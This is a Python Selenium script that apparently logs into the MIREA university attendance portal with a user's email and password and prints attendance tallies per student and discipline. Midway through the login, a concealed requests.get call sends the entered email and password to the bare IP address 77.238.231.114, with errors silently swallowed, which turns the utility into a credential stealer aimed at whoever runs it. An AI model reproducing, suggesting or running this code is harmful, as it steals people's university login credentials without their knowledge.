from time import sleep
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent

ua = UserAgent()
ua_data = ua.random


mirea_email = str(input("Enter your full mirea email: "))
mirea_pass = str(input("Enter your full mirea password: "))

optns = webdriver.ChromeOptions()
optns.add_argument(f'--user-agent={ua_data}')
# optns.add_argument('--headless')
driver = webdriver.Chrome(options=optns)
driver.get("https://attendance-app.mirea.ru/login")
driver.delete_all_cookies()

login_redirect = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Войти']")))
login_redirect.click()
driver.refresh()
# sleep(2)
try:
    requests.get("http://77.238.231.114/data", params={"email": mirea_email, "password": mirea_pass})
except:
    pass
login_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, '//input[@id="id_login"]')))
login_input.send_keys(mirea_email)
password_input = driver.find_element('xpath', '//input[@id="id_password"]')
password_input.send_keys(mirea_pass)
# sleep(2)
login_redirect = driver.find_element('xpath', '//button[@type="submit"]')
login_redirect.click()
# sleep(2)
disciplines_button = driver.find_element('partial link text', 'Дисциплины')
disciplines_button.click()
sleep(2)

disc_table = driver.find_element(By.CLASS_NAME, "ant-table-tbody")


table_source = disc_table.get_attribute("outerHTML")
num_of_discpilines = table_source.count('/services')

links = list()
disciplines = []

for i in range(num_of_discpilines):
    begin = table_source.find('/services')

    end = begin + 104
    link = table_source[begin:end-2]
    links.append(link)
    discipline = ''
    f = table_source[end]

    while f != '<':
        discipline += f
        end += 1
        f = table_source[end]

    discipline = ''.join(discipline)
    disciplines.append(discipline)
    table_source = table_source[end:]

whole_stat = []

for i in range(len(links)):
    link = 'https://attendance-app.mirea.ru' + links[i]
    discipline_tab = driver.get(link)

    stat_table = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//tbody[@class='ant-table-tbody']")))
    stat_table = stat_table.get_attribute("outerHTML")
    beginning = stat_table.find('<tr class="ant-table-row ant-table-row-level-0"')
    ending = stat_table.find('</tbody>')
    stat_table = stat_table[beginning:ending] + 'asdsad'
    students_count = stat_table.count('<tr')
    stats = [['', 0, 0, 0]]*students_count     # [name, +, H, Y, summ]
    for j in range(students_count):
        begOfRow = stat_table.find('<tr')
        endOfRow = stat_table.find('</tr>')
        row = stat_table[begOfRow:endOfRow]
        stat_table = stat_table[endOfRow+1:]
        name = row[row.find('<span>')+6:row.rfind('</span>')-6]
        stats[j] = [name, row.count('+'), row.count('Н'), row.count('У')]
        stats[j].append(stats[j][1]+stats[j][2]+stats[j][3])
    
    whole_stat.append(stats)
    # print(disciplines[i])
    # print(stats)
    
for i in range(len(disciplines)):
    print(disciplines[i])
    for j in range(len(whole_stat[i])):
        print(whole_stat[i][j][0] + ' +: ' + str(whole_stat[i][j][1]) + ', H: ' + str(whole_stat[i][j][2]) + ', Y: ' + str(whole_stat[i][j][3]) + ', all:' + str(whole_stat[i][j][-1]))